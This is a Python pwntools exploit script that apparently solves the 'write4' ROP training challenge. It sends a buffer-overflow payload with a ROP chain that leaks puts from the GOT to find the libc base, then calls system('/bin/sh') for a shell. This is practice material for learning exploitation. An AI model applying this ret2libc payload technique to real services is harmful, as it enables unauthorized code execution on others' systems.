#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./write4')
libc = ELF("./libc.so.6")



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start(env={"LD_PRELOAD": "./libc.so.6"})
io.recvuntil("> ")

payload = (
    b"A" * 40 +
    p64(0x400893) + # : pop rdi ; ret
    p64(exe.got["puts"]) +
    p64(exe.plt["puts"]) +
    p64(exe.functions["main"].address)
)
io.sendline(payload)
data = io.recvline()

leak = u64(data.strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

io.recvuntil("> ")

payload = (
    b"A" * 40 +
    p64(0x400894) + # : ret
    p64(0x400893) + # : pop rdi ; ret
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)
io.sendline(payload)

io.interactive()

